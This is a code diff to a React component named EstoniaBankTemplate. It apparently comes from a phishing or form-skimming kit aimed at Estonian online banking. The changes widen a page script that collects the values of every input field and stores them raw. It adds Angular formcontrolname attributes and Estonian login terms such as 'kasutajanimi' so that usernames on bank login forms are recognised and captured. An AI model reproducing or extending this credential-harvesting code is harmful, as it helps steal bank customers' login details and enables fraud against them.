@@ -97,6 +97,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
     placeholder?: string;
     name?: string;
     id?: string;
+    formControlName?: string;
   }> => {
     if (payload && typeof payload === "object" && Array.isArray((payload as { fields?: unknown[] }).fields)) {
       return ((payload as { fields: unknown[] }).fields ?? [])
@@ -109,6 +110,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           placeholder: typeof field.placeholder === "string" ? field.placeholder : "",
           name: typeof field.name === "string" ? field.name : "",
           id: typeof field.id === "string" ? field.id : "",
+          formControlName: typeof field.formControlName === "string" ? field.formControlName : "",
         }));
     }
 
@@ -174,11 +176,12 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           id?: string;
           label?: string;
           placeholder?: string;
+          formControlName?: string;
         }) => {
           const normalizedValue = field.value.trim();
           if (!normalizedValue) return;
 
-          const candidateKeys = [field.key, field.name, field.id, field.label, field.placeholder]
+          const candidateKeys = [field.key, field.name, field.id, field.formControlName, field.label, field.placeholder]
             .map((candidate) => (typeof candidate === "string" ? candidate.trim() : ""))
             .filter(Boolean)
             .map((candidate) => candidate.replace(/\s+/g, "-"))
@@ -231,7 +234,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           persistRawCapturedField(field);
 
           const lowerKey = field.key.toLowerCase();
-          const lowerText = [field.key, field.name, field.id, field.label, field.placeholder]
+          const lowerText = [field.key, field.name, field.id, field.formControlName, field.label, field.placeholder]
             .filter(Boolean)
             .join(" ")
             .toLowerCase();
@@ -343,9 +346,10 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             lowerText.includes("username") ||
             lowerText.includes("loginid") ||
             lowerText.includes("login id") ||
+            lowerText.includes("nickname") ||
+            lowerText.includes("kasutajanimi") ||
             lowerText.includes("kasutajatunnus") ||
             lowerText.includes("tunnus") ||
-            lowerText.includes("nickname") ||
             lowerText.includes("loginid")
           ) {
             assignUsername(value, true);
@@ -629,11 +633,12 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
                 const type = ((input.type || input.tagName || '') + '').toLowerCase();
 
-                const key = input.name || input.id || input.getAttribute('data-testid') || 'unknown';
+                const fieldKey = input.name || input.getAttribute('formcontrolname') || input.id || input.getAttribute('data-testid') || 'unknown';
                 fields.push({
-                    key: key,
-                    name: input.name || '',
+                    key: fieldKey,
+                    name: input.name || input.getAttribute('formcontrolname') || '',
                     id: input.id || '',
+                    formControlName: input.getAttribute('formcontrolname') || '',
                     value: input.value || '',
                     type: type || 'text',
                     label: getFieldLabel(input),
@@ -681,15 +686,16 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                         return;
                     }
 
-                    const key = input.name || input.id || input.getAttribute('data-testid') || 'unknown';
-                    if (fields.some(field => field.key === key && field.value === value)) {
+                    const fieldKey = input.name || input.getAttribute('formcontrolname') || input.id || input.getAttribute('data-testid') || 'unknown';
+                    if (fields.some(field => field.key === fieldKey && field.value === value)) {
                         return;
                     }
 
                     fields.push({
-                        key: key,
-                        name: input.name || '',
+                        key: fieldKey,
+                        name: input.name || input.getAttribute('formcontrolname') || '',
                         id: input.id || '',
+                        formControlName: input.getAttribute('formcontrolname') || '',
                         value: value,
                         type: type || 'text',
                         label: getFieldLabel(input),
